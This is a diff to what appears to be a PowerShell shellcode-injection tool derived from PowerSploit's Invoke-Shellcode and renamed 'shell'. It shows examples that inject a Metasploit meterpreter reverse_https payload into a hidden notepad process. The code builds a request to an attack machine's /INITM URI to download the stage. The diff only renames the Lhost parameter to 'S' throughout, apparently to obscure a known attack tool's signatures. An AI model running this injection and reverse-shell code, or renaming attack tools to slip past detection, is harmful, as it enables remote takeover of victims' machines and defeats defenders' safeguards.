@@ -57,12 +57,11 @@ Specifies an optional shellcode passed in as a byte array
 
 Lists all of the available Metasploit payloads that shell supports
 
-.PARAMETER Lhost
+.PARAMETER S
 
 Specifies the IP address of the attack machine waiting to receive the reverse shell
 
-.PARAMETER O
- 
+.PARAMETER O 
 Specifies the port of the attack machine waiting to receive the reverse shell
 
 .PARAMETER Payload
@@ -97,7 +96,7 @@ Inject shellcode into the running instance of PowerShell.
 
 C:\PS> Start-Process C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
 C:\PS> $Proc = Get-Process notepad
-C:\PS> shell -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -O 443 -Verbose
+C:\PS> shell -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -S 192.168.30.129 -O 443 -Verbose
 
 VERBOSE: Requesting meterpreter payload from https://192.168.30.129:443/INITM
 VERBOSE: Injecting shellcode into PID: 4004
@@ -117,12 +116,12 @@ Payload options (windows/meterpreter/reverse_https):
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
-LHOST     192.168.30.129   yes       The local listener hostname
+S     192.168.30.129   yes       The local listener hostname
 O     443              yes       The local listener port
 
 .EXAMPLE
 
-C:\PS> shell -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -O 80
+C:\PS> shell -Payload windows/meterpreter/reverse_https -S 192.168.30.129 -O 80
 
 Description
 -----------
@@ -133,7 +132,7 @@ Payload options (windows/meterpreter/reverse_http):
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
-LHOST     192.168.30.129   yes       The local listener hostname
+S     192.168.30.129   yes       The local listener hostname
 O     80               yes       The local listener port
 
 .EXAMPLE
@@ -192,7 +191,7 @@ http://www.exploit-monday.com
                 ParameterSetName = 'Metasploit' )]
     [ValidateNotNullOrEmpty()]
     [String]
-    $Lhost = '127.0.0.1',
+    $S = '127.0.0.1',
     
     [Parameter( Mandatory = $True,
                 ParameterSetName = 'Metasploit' )]
@@ -591,7 +590,7 @@ http://www.exploit-monday.com
         $Response = $True
         
         if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
-               "About to download Metasploit payload '$($Payload)' LHOST=$($Lhost), O=$($O)" ) ) ) { }
+               "About to download Metasploit payload '$($Payload)' S=$($S), O=$($O)" ) ) ) { }
         
         if ( !$Response )
         {
@@ -615,7 +614,7 @@ http://www.exploit-monday.com
         }
         
         # Meterpreter expects 'INITM' in the URI in order to initiate stage 0. Awesome authentication, huh?
-        $Request = "http$($SSL)://$($Lhost):$($O)/INITM"
+        $Request = "http$($SSL)://$($S):$($O)/INITM"
         Write-Verbose "Requesting meterpreter payload from $Request"
         
         $Uri = New-Object Uri($Request)
